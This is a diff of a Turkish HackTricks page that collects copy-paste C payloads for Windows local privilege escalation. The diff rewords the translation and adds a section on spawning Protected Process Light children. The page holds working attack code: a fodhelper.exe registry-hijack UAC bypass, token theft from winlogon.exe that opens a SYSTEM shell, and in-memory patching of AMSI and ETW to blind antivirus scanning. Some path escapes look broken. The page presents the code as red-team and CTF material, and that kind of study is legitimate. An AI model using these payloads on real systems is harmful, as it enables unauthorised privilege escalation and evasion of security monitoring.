@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Bu sayfa, **Windows Yerel Yetki Yükseltme** veya sonrası için kullanışlı olan **küçük, bağımsız C parçacıklarını** toplar. Her payload, **kopyala-yapıştır dostu** olacak şekilde tasarlanmıştır, yalnızca Windows API / C çalışma zamanı gerektirir ve `i686-w64-mingw32-gcc` (x86) veya `x86_64-w64-mingw32-gcc` (x64) ile derlenebilir.
+Bu sayfa, Windows Local Privilege Escalation veya post-exploitation sırasında kullanışlı olan **küçük, kendi içinde bağımsız C snippet'lerini** toplar. Her payload, **kopyala-yapıştır dostu** olacak şekilde tasarlanmıştır, yalnızca Windows API / C runtime gerektirir ve `i686-w64-mingw32-gcc` (x86) veya `x86_64-w64-mingw32-gcc` (x64) ile derlenebilir.
 
-> ⚠️  Bu payload'lar, işlemin gerekli minimum yetkilere sahip olduğunu varsayar (örneğin, `SeDebugPrivilege`, `SeImpersonatePrivilege` veya UAC atlatması için orta düzey bütünlük bağlamı). Bunlar, bir güvenlik açığını istismar etmenin rastgele yerel kod yürütmesine yol açtığı **kırmızı takım veya CTF ortamları** için tasarlanmıştır.
+> ⚠️  Bu payload'ların, işlemin eylemi gerçekleştirmek için gerekli asgari ayrıcalıklara zaten sahip olduğunu varsaydığını unutmayın (ör. `SeDebugPrivilege`, `SeImpersonatePrivilege`, veya bir UAC bypass için medium-integrity context). Bu payloadlar, bir güvenlik açığının rastgele native kod çalıştırmaya yol açtığı **red-team veya CTF ortamları** için tasarlanmıştır.
 
 ---
 
@@ -20,14 +20,14 @@ return 0;
 ```
 ---
 
-## UAC Atlatma – `fodhelper.exe` Kayıt Defteri İstismarı (Orta → Yüksek bütünlük)
-Güvenilir ikili **`fodhelper.exe`** çalıştırıldığında, aşağıdaki kayıt defteri yolunu **`DelegateExecute` fiilini filtrelemeden** sorgular. Bu anahtarın altına komutumuzu yerleştirerek bir saldırgan, dosyayı diske bırakmadan UAC'yi atlayabilir.
+## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
+Güvenilir ikili **`fodhelper.exe`** çalıştırıldığında, aşağıdaki kayıt defteri yolunu **`DelegateExecute` fiilini filtrelemeden** sorgular. Bu anahtarın altına komutumuzu yerleştirerek bir saldırgan, UAC'yi *dosyayı diske yazmadan* bypass edebilir.
 
-*Kayıt defteri yolu `fodhelper.exe` tarafından sorgulandı*
+*`fodhelper.exe` tarafından sorgulanan kayıt defteri yolu*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-Bir yükseltilmiş `cmd.exe` açan minimal PoC:
+Yükseltilmiş `cmd.exe` açan minimal PoC:
 ```c
 // x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
 #define _CRT_SECURE_NO_WARNINGS
@@ -61,12 +61,12 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Windows 10 22H2 ve Windows 11 23H2'de (Temmuz 2025 yamanları) test edilmiştir. Bypass hala çalışıyor çünkü Microsoft `DelegateExecute` yolundaki eksik bütünlük kontrolünü düzeltmedi.*
+*Windows 10 22H2 ve Windows 11 23H2 (Temmuz 2025 yamaları) üzerinde test edildi. Bypass hâlâ çalışıyor çünkü Microsoft `DelegateExecute` yolundaki eksik bütünlük denetimini düzeltmedi.*
 
 ---
 
-## Token çoğaltma ile SYSTEM shell oluşturma (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-Eğer mevcut süreç **her iki** `SeDebug` ve `SeImpersonate` ayrıcalıklarına sahipse (birçok hizmet hesabı için tipik), `winlogon.exe`'den token'ı çalabilir, çoğaltabilir ve yükseltilmiş bir süreç başlatabilirsiniz:
+## Token çoğaltma yoluyla SYSTEM shell başlatma (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+Eğer mevcut süreç **hem** `SeDebug` hem de `SeImpersonate` ayrıcalıklarına sahipse (birçok servis hesabı için tipik), `winlogon.exe`'den token çalabilir, çoğaltabilir ve yükseltilmiş bir süreç başlatabilirsiniz:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -102,7 +102,7 @@ DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPri
 STARTUPINFOW si = { .cb = sizeof(si) };
 PROCESS_INFORMATION pi = { 0 };
 if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
-L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
 NULL, NULL, &si, &pi)) {
 CloseHandle(pi.hProcess);
 CloseHandle(pi.hThread);
@@ -114,7 +114,7 @@ if (dupToken) CloseHandle(dupToken);
 return 0;
 }
 ```
-Daha derin bir açıklama için:
+Bunun nasıl çalıştığının daha derin bir açıklaması için bakınız:
 
 {{#ref}}
 sedebug-+-seimpersonate-copy-token.md
@@ -122,8 +122,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## Bellek İçi AMSI & ETW Yamanlama (Savunma Kaçışı)
-Çoğu modern AV/EDR motoru, kötü niyetli davranışları incelemek için **AMSI** ve **ETW**'ye dayanır. Mevcut süreç içinde her iki arayüzü erken yamanamak, script tabanlı yüklerin (örneğin PowerShell, JScript) taranmasını engeller.
+## Bellek içi AMSI & ETW Yaması (Defence Evasion)
+Çoğu modern AV/EDR motoru, kötü amaçlı davranışları incelemek için **AMSI** ve **ETW**'ye güvenir. Her iki arayüzün de mevcut işlem içinde erken yamanması, script tabanlı payload'ların (ör. PowerShell, JScript) taranmasını engeller.
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +150,56 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*Yukarıdaki yamanın işlem yerelidir; bunu çalıştırdıktan sonra yeni bir PowerShell başlatmak, AMSI/ETW denetimi olmadan çalışacaktır.*
+*Yukarıdaki yama işlem düzeyindedir; çalıştırdıktan sonra yeni bir PowerShell başlatmak AMSI/ETW denetimi olmadan yürütülecektir.*
 
 ---
 
-## Referanslar
-* Ron Bowes – “Fodhelper UAC Bypass Derinlemesine İnceleme” (2024)
-* SplinterCode – “AMSI Bypass 2023: En Küçük Yama Hala Yeterli” (BlackHat Asya 2023)
+## Alt süreci Protected Process Light (PPL) olarak oluştur
+Oluşturma sırasında bir alt süreç için PPL koruma seviyesi isteğinde bulunun `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` kullanarak. Bu belgelenmiş bir API'dir ve yalnızca hedef imaj istenen imzalayıcı sınıfı için imzalanmışsa başarılı olur (Windows/WindowsLight/Antimalware/LSA/WinTcb).
+```c
+// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
+#include <windows.h>
+
+int wmain(void) {
+STARTUPINFOEXW si = {0};
+PROCESS_INFORMATION pi = {0};
+si.StartupInfo.cb = sizeof(si);
+
+SIZE_T attrSize = 0;
+InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+
+DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
+&lvl, sizeof(lvl), NULL, NULL);
+
+if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
+EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
+return 1;
+}
+DeleteProcThreadAttributeList(si.lpAttributeList);
+HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+CloseHandle(pi.hThread);
+CloseHandle(pi.hProcess);
+return 0;
+}
+```
+En yaygın kullanılan seviyeler:
+- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
+- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
+- `PROTECTION_LEVEL_LSA_LIGHT` (4)
+
+Sonucu Process Explorer/Process Hacker ile Protection sütununu kontrol ederek doğrulayın.
+
+---
+
+## Kaynaklar
+* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
+* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
+* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
 
 {{#include ../../banners/hacktricks-training.md}}
